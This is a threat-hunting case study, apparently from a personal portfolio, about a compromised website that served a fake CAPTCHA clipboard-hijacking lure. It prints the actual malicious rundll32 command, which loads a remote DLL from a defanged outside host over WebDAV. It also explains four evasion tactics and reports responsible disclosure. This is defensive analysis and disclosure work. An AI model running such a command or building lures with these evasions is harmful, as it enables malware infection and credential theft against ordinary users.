
# 🕵️‍♂️ Threat Hunting Case Study: Evasive LotL Web Injection

## Executive Summary
During routine OSINT and B2B prospecting of US-based IT service providers, I encountered a compromised CMS serving a malicious social engineering payload. I successfully isolated the payload, reverse-engineered the execution chain, and identified a highly sophisticated Living-off-the-Land (LotL) attack utilizing advanced evasion techniques. 

Responsible disclosure was immediately initiated to the affected organization's owner.

## 🛠️ Initial Discovery & Payload Isolation
Upon accessing the target's homepage from a residential IP outside the US, the site served a fake Cloudflare/reCAPTCHA verification screen. This is a known social engineering tactic (commonly associated with ClearFake or Lumma Stealer campaigns) designed to trick users into manual payload execution.

* **Attack Vector:** Clipboard Hijacking via Malicious JavaScript Injection
* **Prompted User Action:** `Win + R` followed by `Ctrl + V` and `Enter`

Instead of executing the command, I isolated the clipboard contents into a secure text editor for analysis.

* ![Evidence](https://github.com/AlexPopCyberSec/My-IT-Career-Transition-Journey/blob/main/Threat-Analysis-MSP-Website-Compromise/images/captcha.png)

## 🔬 Technical Analysis
The isolated payload revealed a Living-off-the-Land (LotL) execution chain designed to bypass standard browser security and network firewalls.

**The Executable Command:**
`rundll32.exe \\host4link[.]datacentricnode[.]in[.]net@80\verification.google,#1`

**Breakdown of Mechanics:**
1.  **`rundll32.exe`:** Utilizes a trusted, built-in Windows binary to execute the malicious code, masking the activity from basic endpoint detection.
2.  **WebDAV Evasion (`@80`):** By forcing the UNC path over port 80 (WebDAV) instead of standard port 445 (SMB), the attackers successfully bypass standard corporate outbound SMB blocking rules.
3.  **Disguised Payload:** The target file (`verification.google`) is a disguised malicious DLL. The `,#1` flag instructs `rundll32` to execute the first exported function of that DLL.

* ![Evidence](https://github.com/AlexPopCyberSec/My-IT-Career-Transition-Journey/blob/main/Threat-Analysis-MSP-Website-Compromise/images/payload.jpg)

## 🥷 Advanced Evasion Tactics Identified
Further investigation revealed why the target organization's internal IT team had not detected the compromise. The threat actors deployed four distinct evasion layers:

* **Geo/Network Targeting:** The payload remained dormant for local US IPs and active admin sessions, triggering only for new, external residential visitors.
* **Zero-Day Domain Rotation:** The payload URLs dynamically cycled on the fly. While older domains were flagged by VirusTotal, the rotational speed allowed new domains to temporarily bypass AV reputation scanners.
* **Mobile/User-Agent Sniffing:** When accessed via a mobile device (where a Windows `rundll32` command is useless), the script hid the payload entirely and loaded the legitimate website.
* **Anti-Sandbox Detection:** Scanning the URL through automated environments (e.g., `urlscan.io`) returned a clean verdict. The script actively detects and hides from known datacenter/scanner IP ranges.

* ![Evidence](https://github.com/AlexPopCyberSec/My-IT-Career-Transition-Journey/blob/main/Threat-Analysis-MSP-Website-Compromise/images/link.png)
* ![Evidence](https://github.com/AlexPopCyberSec/My-IT-Career-Transition-Journey/blob/main/Threat-Analysis-MSP-Website-Compromise/images/link2.png)
* ![Evidence](https://github.com/AlexPopCyberSec/My-IT-Career-Transition-Journey/blob/main/Threat-Analysis-MSP-Website-Compromise/images/url-scan.jpeg)

## 🤝 Resolution
Following ethical cybersecurity practices, I compiled the payload data, execution mechanics, and evasion tactics into a comprehensive incident report and securely disclosed it to the organization's ownership to facilitate immediate patching.
## ✅ Outcome
Within 24 hours of my disclosure, the target organization successfully identified the compromised CMS component and completely removed the malicious injection. Follow-up testing across multiple residential IPs, VPN nodes, and mobile networks confirmed that the payload is no longer active and the site has been fully secured.

---

### 📝 Report Details
* **Threat Analysis Performed By:** Aleksandar Popov
* **Date of Discovery:** March 20, 2026
* **Status:** Resolved (Vulnerability Patched)

🔗 **Connect with me:** [LinkedIn](https://www.linkedin.com/in/aleksandar-popov-578084377/) | [Website](https://alexpopov.tech/)
